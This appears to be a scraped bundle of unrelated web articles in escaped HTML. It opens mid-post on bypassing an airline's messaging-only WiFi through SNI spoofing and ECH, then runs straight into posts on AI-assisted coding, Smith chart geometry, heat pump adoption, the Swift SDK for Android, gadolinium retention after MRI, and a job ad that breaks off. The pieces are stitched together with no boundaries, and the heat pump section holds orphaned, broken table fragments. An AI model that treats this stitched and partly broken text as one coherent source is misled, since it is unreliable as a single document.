    &lt;p&gt;Unfortunately, trying to load websites with heavier assets would fail, with images on simple text blogs loading line-by-line. Well, at least its some dial-up nostalgia!&lt;/p&gt;
    &lt;p&gt;My guess is that on the free WiFi, apart from the SNI checks, they also throttle the bandwidth. Maybe they anticipated this kind of circumvention. On the other hand, if this is really the internet speed that the full plan unlocksâ¦&lt;/p&gt;
    &lt;head rend="h2"&gt;Bonus: ECH&lt;/head&gt;
    &lt;p&gt;Earlier above I talked about work being done to fix the SNI leakage: ECH. The scope of explaining how it works is out of scope here, but I do encourage you to read up on it. Pretty good stuff! Itâll help this section make more sense.&lt;/p&gt;
    &lt;p&gt;I operate an ECH test website, so I decided to do some more setup before my flight. I basically created another ECHConfig, with the public_name set to &lt;code&gt;wa.me&lt;/code&gt;. Iâve a bit of a guide on how to do this btw, though it could do with some improvements.&lt;/p&gt;
    &lt;p&gt;Anyway, since ECH world, the public SNI is purely for the server to complete the outer ClientHello, and since ECH clients set the public SNI based on the ECHConfig, I can type in my real domain in firefox, which will still use the &lt;code&gt;wa.me&lt;/code&gt; domain as the public SNI. The inner Client Hello will then occur securely, containing the real SNI of &lt;code&gt;rfc5746.mywaifu.best&lt;/code&gt;, and the handshake will complete with the âlegitâ CA-signed certificate for that domain.&lt;/p&gt;
    &lt;p&gt;This worked as well, and without any TLS ignore flags, since the actual cert for &lt;code&gt;rfc5746.mywaifu.best&lt;/code&gt; was signed by a âtrusted CAâ (Letâs Encrypt). Whatâs more interesting is that this worked even on a non-standart TLS port: &lt;code&gt;7443&lt;/code&gt;! Not sure exactly why, but Iâm not complaining.&lt;/p&gt;
    &lt;head rend="h3"&gt;A note on ECHConfig resolution&lt;/head&gt;
    &lt;p&gt;Typically, ECHConfigs should be resolved via encrypted DNS, such as DNS-over-HTTPS. I believe this is what firefox does by default. I am not 100% sure if this is what happened while I was in flight, since Iâd think the DoH would be blocked on messaging WiFi? Or maybe they allow the DoH SNI as well, since newer phones default to that. If any of you are flying BA anytime soon, try it out and let me know!&lt;/p&gt;
    &lt;head rend="h2"&gt;SNI: Donât blindly trust it&lt;/head&gt;
    &lt;p&gt;SNI, as the name indicates (sorry) is just a âhintâ of sorts, from the client to the server. If someone controls both sides (client &amp;amp; server), they can put whatever fake value they want in here, for middleboxes to sniff out and try to analyze. While this unfortunately does work for applications like censorship (where an ISP or country is trying to block a particular website), for use cases such as threat detection it should not be relied on; malwre authors can âspoofâ the SNI when connecting to their C&amp;amp;C, since they donât actually need it, but it may look more innocent to middleboxes.&lt;/p&gt;
    &lt;head rend="h2"&gt;Questions?&lt;/head&gt;
    &lt;p&gt;I would be happy to answer any questions you have! You can contact me via email, and please use my PGP key to encrypt all communications. (Backup E-Mail (PGP Key))&lt;/p&gt;

    &lt;head rend="h1"&gt;Code like a surgeon&lt;/head&gt;
    &lt;p&gt;A lot of people say AI will make us all “managers” or “editors”…but I think this is a dangerously incomplete view!&lt;/p&gt;
    &lt;p&gt;Personally, I’m trying to code like a surgeon.&lt;/p&gt;
    &lt;p&gt;A surgeon isn’t a manager, they do the actual work! But their skills and time are highly leveraged with a support team that handles prep, secondary tasks, admin. The surgeon focuses on the important stuff they are uniquely good at.&lt;/p&gt;
    &lt;p&gt;My current goal with AI coding tools is to spend 100% of my time doing stuff that matters. (As a UI prototyper, that mostly means tinkering with design concepts.)&lt;/p&gt;
    &lt;p&gt;It turns out there are a LOT of secondary tasks which AI agents are now good enough to help out with. Some things I’m finding useful to hand off these days:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Before attempting a big task, write a guide to relevant areas of the codebase&lt;/item&gt;
      &lt;item&gt;Spike out an attempt at a big change. Often I won’t use the result but I’ll review it as a sketch of where to go&lt;/item&gt;
      &lt;item&gt;Fix typescript errors or bugs which have a clear specification&lt;/item&gt;
      &lt;item&gt;Write documentation about what I’m building&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;I often find it useful to run these secondary tasks async in the background – while I’m eating lunch, or even literally overnight!&lt;/p&gt;
    &lt;p&gt;When I sit down for a work session, I want to feel like a surgeon walking into a prepped operating room. Everything is ready for me to do what I’m good at.&lt;/p&gt;
    &lt;head rend="h2"&gt;Mind the autonomy slider&lt;/head&gt;
    &lt;p&gt;Notably, there is a huge difference between how I use AI for primary vs secondary tasks.&lt;/p&gt;
    &lt;p&gt;For the core design prototyping work, I still do a lot of coding by hand, and when I do use AI, I’m more careful and in the details. I need fast feedback loops and good visibility. (eg, I like Cursor tab-complete here)&lt;/p&gt;
    &lt;p&gt;Whereas for secondary tasks, I’m much much looser with it, happy to let an agent churn for hours in the background. The ability to get the job done eventually is the most important thing; speed and visibility matter less. Claude Code has been my go-to for long unsupervised sessions but Codex CLI is becoming a strong contender there too, possibly my new favorite.&lt;/p&gt;
    &lt;p&gt;These are very different work patterns! Reminds me of Andrej Karpathy’s “autonomy slider” concept. It’s dangerous to conflate different parts of the autonomy spectrum – the tools and mindset that are needed vary quite a lot.&lt;/p&gt;
    &lt;head rend="h2"&gt;Your agent doesn’t need a career trajectory&lt;/head&gt;
    &lt;p&gt;The “software surgeon” concept is a very old idea – Fred Brooks attributes it to Harlan Mills in his 1975 classic “The Mythical Man-Month”. He talks about a “chief programmer” who is supported by various staff including a “copilot” and various administrators. Of course, at the time, the idea was to have humans be in these support roles.&lt;/p&gt;
    &lt;p&gt;OK, so there is a super obvious angle here, that “AI has now made this approach economically viable where it wasn’t before”, yes yes… but I am also noticing a more subtle thing at play, something to do with status hierarchies.&lt;/p&gt;
    &lt;p&gt;A lot of the “secondary” tasks are “grunt work”, not the most intellectually fulfilling or creative part of the work. I have a strong preference for teams where everyone shares the grunt work; I hate the idea of giving all the grunt work to some lower-status members of the team. Yes, junior members will often have more grunt work, but they should also be given many interesting tasks to help them grow.&lt;/p&gt;
    &lt;p&gt;With AI this concern completely disappears! Now I can happily delegate pure grunt work. And the 24/7 availability is a big deal. I would never call a human intern at 11pm and tell them to have a research report on some code ready by 7am… but here I am, commanding my agent to do just that!&lt;/p&gt;
    &lt;head rend="h2"&gt;Notion is for surgeons?&lt;/head&gt;
    &lt;p&gt;Finally I’ll mention a couple thoughts on how this approach to work intersects with my employer, Notion.&lt;/p&gt;
    &lt;p&gt;First, as an employee, I find it incredibly valuable right now to work at a place that is bullish on AI coding tools. Having support for heavy use of AI coding tools, and a codebase that’s well setup for it, is enabling serious productivity gains for me – especially as a newcomer to a big codebase.&lt;/p&gt;
    &lt;p&gt;Secondly, as a product – in a sense I would say we are trying to bring this way of working to a broader group of knowledge workers beyond programmers. When I think about how that will play out, I like the mental model of enabling everyone to “work like a surgeon”.&lt;/p&gt;
    &lt;p&gt;The goal isn’t to delegate your core work, it’s to identify and delegate the secondary grunt work tasks, so you can focus on the main thing that matters.&lt;/p&gt;
    &lt;head rend="h2"&gt;Related reads&lt;/head&gt;
    &lt;p&gt;If you liked this perspective, you might enjoy reading these other posts I’ve written about the nature of human-AI collaboration:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Enough AI copilots! We need AI HUDs: “anyone serious about designing for AI should consider non-copilot form factors that more directly extend the human mind…”&lt;/item&gt;
      &lt;item&gt;AI-generated tools can make programming more fun: “Instead, I used AI to build a custom debugger UI… which made it more fun for me to do the coding myself…”&lt;/item&gt;
      &lt;item&gt;ChatGPT as muse, not oracle: “What if we were to think of LLMs not as tools for answering questions, but as tools for asking us questions and inspiring our creativity?&lt;/item&gt;

  &lt;main&gt;
    &lt;p&gt;The Smith chart from electrical engineering is the image of a Cartesian grid under the function&lt;/p&gt;
    &lt;p&gt;f(z) = (z − 1)/(z + 1).&lt;/p&gt;
    &lt;p&gt;More specifically, it’s the image of a grid in the right half-plane.&lt;/p&gt;
    &lt;p&gt;This post will derive the basic mathematical properties of this graph but will not go into the applications. Said another way, I’ll explain how to make a Smith chart, not how to use one.&lt;/p&gt;
    &lt;p&gt;We will use z to denote points in the right half-plane and w to denote the image of these points under f. We will speak of lines in the z plane and the circles they correspond to in the w plane.&lt;/p&gt;
    &lt;head rend="h2"&gt;Möbius transformations&lt;/head&gt;
    &lt;p&gt;Our function f is a special case of a Möbius transformation. There is a theorem that says Möbius transformation map generalized circles to generalized circles. Here a generalized circle means a circle or a line; you can think of a line as a circle with infinite radius. We’re going to get a lot of mileage out of that theorem.&lt;/p&gt;
    &lt;head rend="h2"&gt;Image of the imaginary axis&lt;/head&gt;
    &lt;p&gt;The function f maps the imaginary axis in the z plane to the unit circle in the w plane. We can prove this using the theorem above. The imaginary axis is a line, so it’s image is either a line or a circle. We can take three points on the imaginary axis in the z plane and see where they go.&lt;/p&gt;
    &lt;p&gt;When we pick z equal to 0, i, and −i from the imaginary axis we get w values of −1, i, and −i. These three w values do not line on a line, so the image of the imaginary axis must be a circle. Furthermore, three points uniquely determine a circle, so the image of the imaginary axis is the circle containing −1, i, and −i, i.e. the unit circle.&lt;/p&gt;
    &lt;head rend="h2"&gt;Image of the right half-plane&lt;/head&gt;
    &lt;p&gt;The imaginary axis is the boundary of the right half-plane. Since it is mapped to the unit circle, the right half-plane is either mapped to the interior of the unit circle or the exterior of the unit circle. The point z = 1 goes to w = 0, and so the right half-plane is mapped inside the unit circle.&lt;/p&gt;
    &lt;head rend="h2"&gt;Images of vertical lines&lt;/head&gt;
    &lt;p&gt;Let’s think about what happens to vertical lines in the z plane, lines with constant positive real part. The images of these lines in the w plane must be either lines or circles. And since the right-half plane gets mapped inside the unit circle, these lines must get mapped to circles.&lt;/p&gt;
    &lt;p&gt;We can say a little more. All lines contain the point ∞, and f(∞) = 1, so the image of every vertical line in the z plane is a circle in the w plane, inside the unit circle and tangent to the unit circle at w = 1. (Tossing around ∞ is a bit informal, but it’s easy to make rigorous.)&lt;/p&gt;
    &lt;p&gt;The vertical lines in the z plane&lt;/p&gt;
    &lt;p&gt;map to tangent circles in the w plane.&lt;/p&gt;
    &lt;head rend="h2"&gt;Images of horizontal lines&lt;/head&gt;
    &lt;p&gt;Next, let’s think about horizontal lines in the z plane, lines with constant imaginary part. The image of these lines is either a line or a circle. Which is it? The image of a line is a line if it contains ∞, otherwise it’s a circle. Now f(z) = ∞ if and only if z = −1, and so the image of the real axis is a line, but the image of every other horizontal line is a circle.&lt;/p&gt;
    &lt;p&gt;Since f(∞) = 1, the image of every horizontal line passes through 1, just as the images of all the vertical lines passes through 1.&lt;/p&gt;
    &lt;p&gt;Since horizontal lines extend past the right half-plane, the image circles extend past the unit circle. The part of the line with positive real part gets mapped inside the unit circle, and the part of the line with negative real part gets mapped outside the unit circle. In particular, the image of the positive real axis is the interval [−1, 1].&lt;/p&gt;
    &lt;p&gt;Möbius transformations are conformal maps, and so they preserve angles of intersection. Since horizontal lines are perpendicular to vertical lines, the circles that are the images of the horizontal lines meet the circles that are the images of vertical lines at right angles.&lt;/p&gt;
    &lt;p&gt;The horizontal rays in the z plane&lt;/p&gt;
    &lt;p&gt;become partial circles in the w plane.&lt;/p&gt;
    &lt;p&gt;If we were to look at horizontal lines rather than rays, i.e. if we extended the lines into the left half-plane, the images in the w plane would be full circles.&lt;/p&gt;
    &lt;p&gt;Now let’s put our images together. The grid&lt;/p&gt;
    &lt;p&gt;in the z plane becomes the following in the w plane.&lt;/p&gt;
    &lt;p&gt;An evenly spaced grid in the z plane becomes a very unevenly spaced graph in the w plane. Things are crowded on the right hand side and sparse on the left. A useable Smith chart needs to be roughly evenly filled in, which means it has to be the image of an unevenly filled in grid in the z plane. For example, you’d need more vertical lines in the z plane with small real values than with large real values.&lt;/p&gt;
  &lt;/main&gt;

    &lt;/list&gt;
    &lt;head rend="h1"&gt;Harnessing America’s Heat Pump Moment&lt;/head&gt;
    &lt;head rend="h2"&gt;The tech works. The policy’s in place. So why are heat pumps still a hard sell?&lt;/head&gt;
    &lt;p&gt;Editor’s note: This is a guest post by Joseph DeNatale, an entrepreneur and project coordinator at Jetson Home. It originally appeared in Climate Drift earlier this year, and is republished on Heat Pumped with permission.&lt;/p&gt;
    &lt;p&gt;Joseph interviewed me when he was researching the piece, and I was excited to see that the final product touched many topics that I've been wanting to write about.&lt;/p&gt;
    &lt;p&gt;A big thank you to Joseph and Climate Drift for sharing with the Heat Pumped community - it's incredibly in-depth. Since there’s so much to digest, we’re splitting it up into 5 parts that we'll be sharing over the next few weeks.&lt;/p&gt;
    &lt;head rend="h2"&gt;Why Execution Is Everything: A Personal Perspective&lt;/head&gt;
    &lt;p&gt;As a small business owner, I’ve built a career not around inventing new things, but around making things happen: making sure systems run smoothly, projects get completed on time, and clients feel taken care of.&lt;/p&gt;
    &lt;p&gt;My work has been rooted in the real-world, hands-on, often chaotic rhythm of operations, logistics, and direct client service. Whether it’s organizing teams to execute live events, refining workflows to scale a growing business, or managing the delicate art of closing a sale, I’ve learned one simple truth: the hardest part is never the idea. It’s the execution.&lt;/p&gt;
    &lt;p&gt;So when I began diving into the world of home electrification—particularly heat pumps—that same truth surfaced again, just with higher stakes.&lt;/p&gt;
    &lt;p&gt;The technology isn’t the issue. In fact, the technology is there. It’s been there for decades, and it is continuing to improve. We’re not waiting on some magical breakthrough or futuristic device.&lt;/p&gt;
    &lt;p&gt;We’re waiting on people—mostly homeowners and home contractors, but also manufacturers and policy makers—to embrace, understand, and implement what already works.&lt;/p&gt;
    &lt;p&gt;This piece isn’t about reinventing the wheel. It’s about understanding why we’re not using the wheel we already have—and what it’s going to take, from the human side of the equation, to make heat pumps the obvious, accessible, and default choice for millions of American homes.&lt;/p&gt;
    &lt;head rend="h3"&gt;Heat Pumps Aren’t New—But This Moment Is&lt;/head&gt;
    &lt;p&gt;In the world of climate solutions, it’s easy to get distracted by what’s shiny and new—sleek devices, breakthrough technologies, futuristic models of sustainability.&lt;/p&gt;
    &lt;p&gt;But not every climate solution is some new-fangled wonder gadget. Some of them already exist. Some of them are sitting in basements and behind houses, quietly doing the work.&lt;/p&gt;
    &lt;p&gt;The heat pump is one of them.&lt;/p&gt;
    &lt;p&gt;Heat pumps are not new. In fact, the idea has been around for well over a century, and the technology has been used widely for decades—mostly in Europe and Asia, but also in pockets of the U.S.—for everything from water heating to whole-home climate control.&lt;/p&gt;
    &lt;p&gt;Modern heat pumps are highly efficient—anywhere from 2-4x more efficient than a furnace—and capable of replacing both a furnace and an air conditioner with a single system in virtually every climate. For millions of homes across the country, they offer a cleaner, quieter, and more precise way to stay comfortable year-round.&lt;/p&gt;
    &lt;p&gt;Importantly, heat pumps have also been shown to match or beat the operating costs of even the cheapest heating option—natural gas—in many cases. This has been demonstrated through both local and national studies. One study showed that over 90% of American households would save on energy bills by replacing worn-out heating equipment with the right-sized heat pump.&lt;/p&gt;
    &lt;p&gt;Installation costs vary wildly depending on many factors in a home, but with the introduction of generous incentives via the Inflation Reduction Act (IRA) and additional state programs, even these costs can be on-par with fossil fuel alternatives.&lt;/p&gt;
    &lt;p&gt;So why aren’t they everywhere?&lt;/p&gt;
    &lt;p&gt;The answer isn’t technical. It’s cultural, economic, and human.&lt;/p&gt;
    &lt;head rend="h3"&gt;TL;DR&lt;/head&gt;
    &lt;p&gt;Heat pumps are proven, efficient, and climate-friendly—but adoption is still slow.&lt;/p&gt;
    &lt;p&gt;The barrier isn’t the tech. It’s people:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;
        &lt;p&gt;Contractors who default to what they know&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;Homeowners who need education and guidance&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;A fragmented market full of noise and misinformation&lt;/p&gt;
      &lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;This piece discusses these challenges, and then explores five keys to accelerating adoption:&lt;/p&gt;
    &lt;list rend="ol"&gt;
      &lt;item&gt;
        &lt;p&gt;Educate homeowners so heat pumps feel familiar and trustworthy.&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;Train the next-gen workforce and upskill legacy HVAC pros.&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;Leverage better tools and data to size and install systems right.&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;Prioritize quality and trust to build social proof and demand.&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;Align policy to phase out one-way ACs and normalize heat pumps.&lt;/p&gt;
      &lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Execution—not invention—is what will move the needle.&lt;/p&gt;
    &lt;head rend="h2"&gt;Hold On.. What’s A Heat Pump Again?&lt;/head&gt;
    &lt;p&gt;If you’re reading this piece, you probably know what a heat pump is (and you can feel free to skip this section).&lt;/p&gt;
    &lt;p&gt;But if you’re among the uninitiated – like, believe it or not, most people – here’s a (very) quick primer. (Editor’s note: check out Heat Pumps 101 if you want to dive deeper)&lt;/p&gt;
    &lt;p&gt;A heat pump works by drawing thermal energy (heat) out of the atmosphere and “pumping” it into the home. This process works in reverse for cooling. (Source)&lt;/p&gt;
    &lt;head rend="h3"&gt;The 2-Way AC&lt;/head&gt;
    &lt;p&gt;The term “heat pump”, it turns out, is a fairly unhelpful name for most people. In fact, there are some leaders in the home electrification industry who believe the name itself is one of the barriers to adoption. It’s one of many ways that the heat pump is misunderstood.&lt;/p&gt;
    &lt;p&gt;Think of a heat pump as a “2-way AC.” An air conditioner cools your home by pulling heat from inside an enclosed space and transferring it outside. Your refrigerator works the same way.&lt;/p&gt;
    &lt;p&gt;A heat pump does the same thing, but can also reverse the process to bring heat into the home. It uses a few key components to make this happen:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;
        &lt;p&gt;The fan pulls air across the system’s coils to help move heat in or out of the space.&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;The evaporator coil absorbs heat from the air inside your home (in cooling mode) or from the outside air (in heating mode).&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;The compressor pressurizes and moves a fluid called refrigerant through the system, enabling the heat transfer process.&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;The refrigerant is the working fluid that captures and carries heat from one place to another—either out of your home or into it.&lt;/p&gt;
      &lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;What’s important to understand is that a heat pump does not create heat. It also doesn’t create cold (cold is the absence of heat, just like darkness is the absence of light). A heat pump simply transfers – pumps! – heat from one place to another.&lt;/p&gt;
    &lt;p&gt;“The difference between a heat pump and a one-way AC is just one valve. It still works perfectly fine as an air conditioner—there’s no difference. That’s why we’ve started calling them “two-way ACs” as an education tool. It helps people compare a two-way AC, which has a reverse gear, with a one-way AC—which, in my mind, is basically broken.”&lt;/p&gt;
    &lt;p&gt;But what about in the winter when it’s below freezing? In any environment where the temperature is above absolute zero (remember the Kelvin scale?) there is still a significant amount of heat in the air in the form of thermal energy.&lt;/p&gt;
    &lt;p&gt;That’s why a heat pump can still heat your home even on the coldest day of the year.&lt;/p&gt;
    &lt;head rend="h2"&gt;Why Heat Pumps Matter&lt;/head&gt;
    &lt;p&gt;The fact that heat pumps simply transfer heat—and do not create it—gives them the potential to heat homes without doing the thing that humans have done since time immemorial to keep warm: burn stuff.&lt;/p&gt;
    &lt;p&gt;In the U.S., over half of all homes still rely on burning fossil fuels for heat. Replacing those systems with electric, air source heat pumps (ASHPs) can significantly reduce household emissions, especially as the grid gets cleaner and moves towards a higher percentage of renewable energy (i.e. not burning stuff).&lt;/p&gt;
    &lt;p&gt;And, because they’re so efficient, heat pumps can lower operating costs over time—although this is highly dependent on where you live, as the cost of fuel and electricity varies widely. They’re also safer (no burning stuff), can improve indoor air quality (again, no burning), and create healthier, more comfortable homes.&lt;/p&gt;
    &lt;p&gt;Finally, heat pumps are a crucial component of an energy-independent home. Paired with solar panels and battery storage, a homeowner can heat and cool their home entirely with energy they generate on their own. Try that with a furnace!&lt;/p&gt;

          &lt;p&gt;Typically lower (although the cost of a furnace + AC if replaced at the same time is often higher)&lt;/p&gt;
        &lt;/cell&gt;
        &lt;cell&gt;
          &lt;p&gt;Often higher upfront, especially for cold-climate models. Costs can be lowered via incentive programs.&lt;/p&gt;

        &lt;/cell&gt;
        &lt;cell&gt;
          &lt;p&gt;Can be lower, especially with efficient models + incentives and/or when paired with solar + battery storage&lt;/p&gt;

        &lt;cell&gt;
          &lt;p&gt;Cold-climate models now perform down to -15 to -20°F&lt;/p&gt;

        &lt;/cell&gt;
        &lt;cell&gt;
          &lt;p&gt;Significant federal/state incentives available&lt;/p&gt;
        &lt;/cell&gt;
      &lt;/row&gt;
    &lt;/table&gt;
    &lt;p&gt;This is not a marginal climate solution. According to the IEA, global heat pump adoption could reduce carbon emissions by half a billion tons annually—roughly equivalent to the annual emissions of all cars in Europe.&lt;/p&gt;
    &lt;head rend="h2"&gt;The Heat Pump Moment Has Arrived&lt;/head&gt;
    &lt;p&gt;For years, heat pumps were a niche topic, something discussed by green building enthusiasts, early adopters, or homeowners with unusually high energy awareness.&lt;/p&gt;
    &lt;p&gt;But that’s no longer the case. Here are four reasons why:&lt;/p&gt;
    &lt;head rend="h3"&gt;Cultural Momentum Is Building&lt;/head&gt;
    &lt;p&gt;The electrification movement is no longer a fringe concept. The push to “electrify everything” has gained traction among policymakers, climate advocates, startups, utilities, and even popular media.&lt;/p&gt;
    &lt;p&gt;From Substack newsletters to YouTube explainers, there’s growing awareness that building decarbonization—and especially heating and cooling—is one of the most practical, scalable ways for regular people to cut their emissions. Campaigns like Rewiring America’s “Go Electric” initiative frame heat pumps not just as energy-efficient appliances, but as a gateway to modern, climate-aligned homes.&lt;/p&gt;
    &lt;p&gt;This momentum is turning into real action. Heat pumps have now outsold gas furnaces in the U.S. every year since 2022.&lt;/p&gt;
    &lt;head rend="h3"&gt;Federal and State Policy Is Aligned (For Now)&lt;/head&gt;
    &lt;p&gt;For the time being (Republicans’ “One Big, Beautiful Bill” notwithstanding), both federal and state governments are backing this transition with significant financial and structural support. Editor’s note: Ouch. Since this piece was originally written, OBBB passed, and most tax credits at the federal level phase out at the end of this year. If you’ve been on the fence about getting a heat pump, now might be a good time to act!&lt;/p&gt;
    &lt;p&gt;The Inflation Reduction Act (IRA) has introduced a suite of rebates, tax credits, and grant programs designed to make heat pumps more affordable and accessible. Single-family households can receive up to $8,000 in upfront rebates for heat pump installations and up to $2,000 in federal tax credits, not to mention additional support for electrical panel upgrades and home energy audits. Editor’s note: the IRA rebates are federally funded, but implemented at the state level. Not all states are participating, and some that are haven’t rolled out their programs yet. In other states like California, the funds are already exhausted.&lt;/p&gt;
    &lt;p&gt;State and local governments are also leading the way in the transition away from fossil fuels on both the demand and supply sides. Programs like Efficiency Maine, TECH Clean California, and Mass Save offer generous incentives and no-interest financing to homeowners that drive the cost of electrification upgrades down even further. Meanwhile, New York City has banned gas in new construction, and Massachusetts has ordered public utilities to begin phasing out natural gas, a move which is being studied in at least 11 other states.&lt;/p&gt;
    &lt;head rend="h3"&gt;Private Capital Is Following&lt;/head&gt;
    &lt;p&gt;The heat pump space is no longer just a niche for contractors and utilities—it’s attracting serious private investment. VC-backed companies like Quilt are reimagining the user experience with sleek, design-forward equipment and app-based controls. Others, like Elephant Energy and Forge, are building “heat pump concierge” platforms that manage the customer journey end-to-end—from sales to install to rebate navigation.&lt;/p&gt;
    &lt;head rend="h3"&gt;The Cold-Climate Performance Myth Has Been Fully Debunked&lt;/head&gt;
    &lt;p&gt;One of the biggest myths about heat pumps—that they can’t handle cold weather—is now being debunked at scale. While older, single-speed models may have struggled in colder temperatures, especially when size and installed incorrectly, modern cold-climate, variable-speed air-source heat pumps can provide reliable heating even at outdoor temperatures of -20°F.&lt;/p&gt;
    &lt;p&gt;These systems are already in use in northern New England, the upper Midwest, and Canada. In Nordic countries—some of the coldest climates in the word—the technology has been viable for decades.&lt;/p&gt;
    &lt;p&gt;And yet, despite all this momentum, heat pump adoption is still slow.&lt;/p&gt;
    &lt;p&gt;Why? Because the hardest part isn’t scaling the technology. It’s aligning the people—contractors, homeowners, policymakers, and market actors—who need to make it happen.&lt;/p&gt;
    &lt;p&gt;“We’ve had the technology dialed for 20, 30, 40 years, depending on how you’re arguing it—but it’s not being applied. It’s a human problem. It’s not a technical one. The technical one has been solved.”&lt;/p&gt;
    &lt;p&gt;That’s where we go next.&lt;/p&gt;
    &lt;p&gt;This is part 1 in a 5 part series about challenges and solutions in accelerating heat pump adoption across the US. Stay tuned for the next issue!&lt;/p&gt;
    &lt;head rend="h2"&gt;Want a heat pump in your own home?&lt;/head&gt;
    &lt;p&gt;The first Heat Pumped group buy generated lots of enthusiasm! There are still a handful of slots left, but you’ll have to act fast if you’re interested. Sign-ups close later this month (or when all the slots fill, whichever comes first).&lt;/p&gt;

    &lt;head rend="h1"&gt;Announcing the Swift SDK for Android&lt;/head&gt;
    &lt;p&gt;Swift has matured significantly over the past decade — extending from cloud services to Windows applications, browser apps, and microcontrollers. Swift powers apps and services of all kinds, and thanks to its great interoperability, you can share code across platforms.&lt;/p&gt;
    &lt;p&gt;The Android workgroup is an open group, free for anyone to join, that aims to expand Swift to Android. Today, we are pleased to announce nightly preview releases of the Swift SDK for Android.&lt;/p&gt;
    &lt;p&gt;This milestone reflects months of effort by the Android workgroup, building on many years of grassroots community effort. With the SDK, developers can begin developing Android applications in Swift, opening new avenues for cross-platform development and accelerating innovation across the mobile ecosystem.&lt;/p&gt;
    &lt;p&gt;The Swift SDK for Android is available today, bundled with the Windows installer or downloadable separately for use on Linux or macOS.&lt;/p&gt;
    &lt;head rend="h2"&gt;Getting Started&lt;/head&gt;
    &lt;p&gt;We’ve published a Getting Started guide to help you set up your first native Swift code on an Android device. The Swift for Android Examples help demonstrate end‑to‑end application workflows on Android.&lt;/p&gt;
    &lt;p&gt;With the Swift SDK for Android, you can now start porting your Swift packages to Android. Over 25% of packages in the Swift Package Index already build for Android, and the Community Showcase now indicates Android compatibility.&lt;/p&gt;
    &lt;p&gt;The swift-java project enables you to interoperate between Java and Swift. It is both a library and a code generator, enabling you to integrate Swift and Java in both directions by automatically generating safe and performant bindings. To learn about generating bindings to bring your business logic to Android, check out the recent Swift Server Side meetup talk by Mads Odgaard.&lt;/p&gt;
    &lt;head rend="h2"&gt;Next Steps&lt;/head&gt;
    &lt;p&gt;This preview release opens many new opportunities to continue improving these tools. We encourage you to share your experiences, ideas, tools and apps on the Swift forums. This post has been published on an associated thread for discussion, and new posts can be shared in the Android category.&lt;/p&gt;
    &lt;p&gt;The Android workgroup is drafting a vision document, currently under review, for directing future work regarding Swift on Android. This vision will outline priority areas and guide community efforts to maximize impact across the ecosystem. In addition, we maintain a project board that tracks the status of major efforts, as well as official CI for the Swift SDK for Android.&lt;/p&gt;
    &lt;p&gt;If you’re as excited as we are, join us and help make this ecosystem even better!&lt;/p&gt;

  &lt;main&gt;&lt;p&gt;Editor's Note&lt;/p&gt;&lt;p&gt;New research offers a potential explanation for why some patients retain toxic metals long after undergoing an MRI.&lt;/p&gt;&lt;p&gt;Published in the journal Magnetic Resonance Imaging, the findings show that gadolinium contrast agents used in MRI scans may react with common dietary compounds to form harmful metal nanoparticles in the body. As detailed in an April 7 Newsweek report on the study, gadolinium-based contrast agents are injected to sharpen MRI images and are typically excreted without causing harm. However, gadolinium particles have been found lingering in the brain, kidneys, blood, and urine years after exposure, and the US Food and Drug Administration links retained gadolinium to nephrogenic systemic fibrosis (NSF).&lt;/p&gt;&lt;p&gt;The study specifically identifies a chemical reaction between gadolinium and oxalic acid—a compound found naturally in foods and produced in the body after ingesting vitamin C—as a likely contributor, Newsweek reports. Lab tests showed oxalic acid caused gadolinium to separate from its chelating agent and form nanoparticles capable of infiltrating cells in various organs.&lt;/p&gt;&lt;p&gt;Lead author Dr Brent Wagner told Newsweek he personally avoids vitamin C when undergoing MRI with contrast, citing its potential to increase gadolinium reactivity. “Metabolic milieu,” including high oxalic acid levels, could explain why some individuals experience severe symptoms while others do not, he said.&lt;/p&gt;&lt;p&gt;According to the article, nearly half of the patients found to have gadolinium traces in the body had received the contrast agent only once, suggesting that individual biology—not dosage—may influence risk. Dr Wagner theorized that nanoparticle formation could trigger a disproportionate immune response, with affected cells sending distress signals that intensify the body’s reaction.&lt;/p&gt;&lt;p&gt;The research team is now building an international patient registry to further study gadolinium accumulation. According to the article, the registry will collect blood, urine, hair, and fingernail samples to help identify individuals at greatest risk and understand long-term retention patterns.&lt;/p&gt;Read More &amp;gt;&amp;gt;&lt;/main&gt;

    &lt;p&gt;Run a bunch of Claude Codes in parallel&lt;/p&gt;
    &lt;p&gt;Hi there! It’s Charlie and Jackson, founders of Conductor.&lt;/p&gt;
    &lt;p&gt;The two of us met eight years ago when we played ultimate frisbee together at Brown. Last year, we quit our jobs at Point72 and Netflix to start a company together.&lt;/p&gt;
    &lt;p&gt;Conductor is used by engineers at YC, Linear, Vercel, Notion, Supabase, and other leading companies, and it’s changing how people work. One user told me:&lt;/p&gt;
    &lt;quote&gt;
      &lt;p&gt;A huge amount of my work now is wildly parallelized, in a way I’ve never had to worry about before. It’s been a while since a dev tool has changed my life [like Conductor did].&lt;/p&gt;
    &lt;/quote&gt;
    &lt;p&gt;There’s a big opportunity ahead of us. In the next few years, humans will shift focus from direct work (writing code) to orchestrating teams of AIs—and we're going to need entirely new interfaces to do it.&lt;/p&gt;
    &lt;p&gt;We want you to help us build them.&lt;/p&gt;
    &lt;p&gt;We’re looking for a scrappy jack of all trades: an idea generator, an explorer, someone who can talk with users, design, prototype, and then actually build a beautiful product.&lt;/p&gt;
    &lt;p&gt;You’re probably a good fit if:&lt;/p&gt;
